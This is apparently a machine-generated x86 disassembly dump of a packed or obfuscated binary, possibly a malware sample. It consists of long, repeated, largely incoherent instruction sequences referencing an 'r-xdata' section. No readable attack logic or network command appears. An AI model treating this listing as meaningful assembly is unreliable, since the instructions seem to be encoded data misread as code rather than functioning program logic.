lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_40232c
sub esi 0xe92e7f58
push esp
push edi
call sub_40224e
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13aa99
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_402171
jg r-xdata
pop eax
pop ecx
jge r-xdata
jns 0xffffffff82029ad3
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
retn
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
pop ecx
add eax 0xfefc8d0f
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
pop edx
jne r-xdata
ja 0xffffffffe85ba07d
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c1308b
jae r-xdata
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
push eax
push ecx
sub esp 0x10
call sub_402153
jo 0xffffffffff29af14
or esi 0xf04c483
xor ebp 0xfffffffe
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
jge r-xdata
js 0x59752e45
jae r-xdata
or eax 0x15ff2875
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jns r-xdata
call sub_402171
sub ebx 0xa3642773
add ebx 0x9c575756
pop ecx
jae r-xdata
mov ecx 0x59054979
push esi
call sub_4021a2
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
jg r-xdata
jge 0x18aa72c
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1000937
jne r-xdata
jpe 0x18c3310e
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
call 0xffffffffcec1639b
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
jae r-xdata
or eax 0x8d0fb671
jl 0xffffffffa1a4b3b7
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1d4de
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4022d0
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
add esp 0x4
ja r-xdata
jge 0x100a5ca
jns r-xdata
add esi 0x99870f
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
pop eax
jg r-xdata
jne 0xffffffffe7c21014
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1e470
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1bec2
jns r-xdata
xor esi 0x76795a59
jb 0x120a567
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jno r-xdata
xor eax 0xff56850f
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c13a23
jae r-xdata
jpo 0x36287a69
jg r-xdata
jge 0xffffffffc0099742
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7287ab9
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4022f3
call [ 0xfffffffff281d277 ]
je 0xffffffffff82ac1f
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jg r-xdata
jl 0xe2494fb
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_402221
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101b960e
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a7a7e
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_40232c
sub esi 0xe92e7f58
push esp
push edi
call sub_40224e
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
jno r-xdata
jno 0xffffffffff13aa99
jmp [ esp + 0x18 ]
or eax 0xfef5830f
jae r-xdata
jo 0xc646690
mov eax 0xff64870f
jge r-xdata
call sub_402164
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
pop ecx
jno r-xdata
xor esi 0xe381807d
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
sub_4021a2
jne r-xdata
jns r-xdata
call [ 0xffffffffea81cd7d ]
pop edx
jae r-xdata
jo 0xffffffffcec14151
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
pop edx
jne r-xdata
ja 0xffffffffe85ba07d
add esp 0x4
jae r-xdata
jg r-xdata
jge 0x18aa72c
pop ecx
add eax 0xfefc8d0f
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c1308b
jae r-xdata
jae r-xdata
or eax 0x8d0fb671
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jns r-xdata
jmp 0x1000937
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4022d0
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
push eax
push ecx
sub esp 0x10
call sub_402153
jo 0xffffffffff29af14
or esi 0xf04c483
xor ebp 0xfffffffe
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
jge r-xdata
js 0x59752e45
jae r-xdata
or eax 0x15ff2875
jns r-xdata
call sub_402171
sub ebx 0xa3642773
add ebx 0x9c575756
pop ecx
jae r-xdata
mov ecx 0x59054979
add esp 0x4
ja r-xdata
jge 0x100a5ca
jns r-xdata
add esi 0x99870f
push esi
call sub_4021a2
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
pop eax
jg r-xdata
jne 0xffffffffe7c21014
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1e470
jmp [ 0xc4830f ]
jne r-xdata
jpe 0x18c3310e
call 0xffffffffcec1639b
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
jns r-xdata
xor esi 0x76795a59
jb 0x120a567
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jl 0xffffffffa1a4b3b7
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1d4de
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c13a23
jae r-xdata
jpo 0x36287a69
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7287ab9
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4022f3
call [ 0xfffffffff281d277 ]
je 0xffffffffff82ac1f
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1bec2
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_402221
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101b960e
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a7a7e
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_40232c
sub esi 0xe92e7f58
push esp
push edi
call sub_40224e
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
xor eax 0xff56850f
jno r-xdata
jno 0xffffffffff13aa99
jmp [ esp + 0x18 ]
or eax 0xfef5830f
jg r-xdata
jge 0xffffffffc0099742
mov eax 0xff64870f
jg r-xdata
jl 0xe2494fb
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
jae r-xdata
jo 0xc646690
jge r-xdata
call sub_402164
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
sub_402221
pop ecx
pop eax
pop edx
pop edx
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jns r-xdata
add esi 0x99870f
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
jae r-xdata
jbe 0xfffffffff2c1e470
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4022d0
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
add esp 0x4
ja r-xdata
jge 0x100a5ca
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
pop eax
jg r-xdata
jne 0xffffffffe7c21014
add [ eax ] al
jae r-xdata
jpo 0x36287a69
jns r-xdata
xor esi 0x76795a59
jb 0x120a567
ja r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
sub esp 0x18
call sub_402221
add edx 0x79810f59
add eax 0xff0e830f
jae r-xdata
sub edi 0xff5b8d0f
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c13a23
pushfd
push eax
call sub_40232c
sub esi 0xe92e7f58
push esp
push edi
call sub_40224e
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
ja r-xdata
jmp 0xffffffffe7287ab9
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4022f3
call [ 0xfffffffff281d277 ]
je 0xffffffffff82ac1f
jae r-xdata
jae r-xdata
jmp [ 0x182464ff ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101b960e
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a7a7e
lea ecx [ edi ]
add eax 0x0
jno r-xdata
jno 0xffffffffff13aa99
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
mov eax 0xff64870f
sub_40224e
pop ecx
pop edx
jns r-xdata
jge r-xdata
jb 0x120a567
jae r-xdata
or edx 0x59b9427f
add esp 0x8
ja r-xdata
add [ eax ] al
add esp 0x4
ja r-xdata
jpo 0xfca540
jns r-xdata
or esi 0xa5810f
add [ eax ] al
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
jno r-xdata
sub edx 0x57e85254
add [ eax ] al
add [ ecx + 0x5a7f58c7 ] al
add [ eax ] al
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c1e470
ja r-xdata
jmp 0xffffffffe7287ab9
jns r-xdata
add esi 0x99870f
ja r-xdata
add esi 0xc7817c73
add esp 0x4
jne r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jae r-xdata
jmp [ 0x182464ff ]
jno r-xdata
and edx 0xff23870f
jae r-xdata
mov eax 0xe3795858
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
push esp
push edi
call sub_40224e
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36287a69
jno r-xdata
jno 0xffffffffff13aa99
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
ja r-xdata
mov eax 0xff64870f
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
sub esp 0x18
call sub_402221
add edx 0x79810f59
add eax 0xff0e830f
ja r-xdata
mov edi 0xcf81337f
pushfd
push eax
call sub_40232c
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
jg r-xdata
jge 0xffffffffe1c13a23
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4022f3
call [ 0xfffffffff281d277 ]
je 0xffffffffff82ac1f
jae r-xdata
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101b960e
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a7a7e
lea ecx [ edi ]
add eax 0x0
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4022d0
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
add esp 0x4
ja r-xdata
jge 0x100a5ca
pop eax
jg r-xdata
jne 0xffffffffe7c21014
add [ eax ] al
jns r-xdata
xor esi 0x76795a59
pop edx
jno r-xdata
and ecx 0xff69830f
jae r-xdata
sub edi 0xff5b8d0f
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
sub_40229e
jg r-xdata
pop ecx
add esp 0x8
ja r-xdata
or edi 0x8d0f647d
jns r-xdata
or esi 0xa5810f
add [ eax ] al
add esi 0xc7817c73
pop edx
jno r-xdata
and ecx 0xff69830f
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c1e470
jae r-xdata
sub edi 0xff5b8d0f
add esp 0x4
jne r-xdata
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jae r-xdata
mov eax 0xe3795858
jns r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jns r-xdata
add [ eax ] al
add esi 0x99870f
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
push esp
push edi
call sub_40224e
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36287a69
jg r-xdata
jge 0xffffffffe1c13a23
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
pushfd
call sub_4022f3
call [ 0xfffffffff281d277 ]
je 0xffffffffff82ac1f
jae r-xdata
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
sub esp 0x18
call sub_402221
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101b960e
pushfd
push eax
call sub_40232c
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
ja r-xdata
jmp 0xffffffffe7287ab9
jae r-xdata
jpo 0x5a9a7a7e
lea ecx [ edi ]
add eax 0x0
jae r-xdata
jmp [ 0x182464ff ]
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jno r-xdata
jno 0xffffffffff13aa99
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
mov eax 0xff64870f
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4022d0
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
ja r-xdata
mov edi 0xcf81337f
add esp 0x4
ja r-xdata
jge 0x100a5ca
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
pop eax
jg r-xdata
jne 0xffffffffe7c21014
add [ eax ] al
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
jns r-xdata
xor esi 0x76795a59
jb 0x120a567
jae r-xdata
add ebx 0x840f3e7f
add [ eax ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
sub_4022d0
jg r-xdata
push ecx
push edi
call sub_402350
or ebx 0x2de0735a
mov ecx 0x8c48359
ja r-xdata
pushfd
push eax
call sub_40232c
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
jns r-xdata
or esi 0xa5810f
add [ eax ] al
add esi 0xc7817c73
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c1e470
add esp 0x4
jne r-xdata
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jae r-xdata
mov eax 0xe3795858
jns r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jns r-xdata
add [ eax ] al
add esi 0x99870f
push esp
push edi
call sub_40224e
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36287a69
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
sub esp 0x18
call sub_402221
add edx 0x79810f59
add eax 0xff0e830f
ja r-xdata
jmp 0xffffffffe7287ab9
jae r-xdata
jmp [ 0x182464ff ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
jno r-xdata
jno 0xffffffffff13aa99
ja r-xdata
mov eax 0xff64870f
ja r-xdata
mov edi 0xcf81337f
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
jg r-xdata
jge 0xffffffffe1c13a23
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4022f3
call [ 0xfffffffff281d277 ]
je 0xffffffffff82ac1f
jae r-xdata
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101b960e
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a7a7e
lea ecx [ edi ]
add eax 0x0
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4022d0
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
add esp 0x4
ja r-xdata
jge 0x100a5ca
pop eax
jg r-xdata
jne 0xffffffffe7c21014
add [ eax ] al
jns r-xdata
xor esi 0x76795a59
jb 0x120a567
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
jae r-xdata
sub edi 0xff5b8d0f
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
sub_40232c
jae r-xdata
push esp
push edx
call sub_40229e
add edi 0x815a7f58
neg [ ecx + 0x5a ]
jns r-xdata
xor ebx 0x7504c483
stosb [ edi ]
jge r-xdata
jb 0x120a567
jae r-xdata
or edx 0x59b9427f
add esp 0x8
ja r-xdata
add [ eax ] al
add esp 0x4
ja r-xdata
jpo 0xfca540
jns r-xdata
or esi 0xa5810f
add [ eax ] al
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
jno r-xdata
sub edx 0x57e85254
add [ eax ] al
add [ ecx + 0x5a7f58c7 ] al
add [ eax ] al
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c1e470
ja r-xdata
jmp 0xffffffffe7287ab9
jns r-xdata
add esi 0x99870f
ja r-xdata
add esi 0xc7817c73
add esp 0x4
jne r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jae r-xdata
jmp [ 0x182464ff ]
jno r-xdata
and edx 0xff23870f
jae r-xdata
mov eax 0xe3795858
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
push esp
push edi
call sub_40224e
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36287a69
jno r-xdata
jno 0xffffffffff13aa99
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
ja r-xdata
mov eax 0xff64870f
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
sub esp 0x18
call sub_402221
add edx 0x79810f59
add eax 0xff0e830f
ja r-xdata
mov edi 0xcf81337f
pushfd
push eax
call sub_40232c
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
jg r-xdata
jge 0xffffffffe1c13a23
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4022f3
call [ 0xfffffffff281d277 ]
je 0xffffffffff82ac1f
jae r-xdata
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101b960e
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a7a7e
lea ecx [ edi ]
add eax 0x0
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4022d0
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
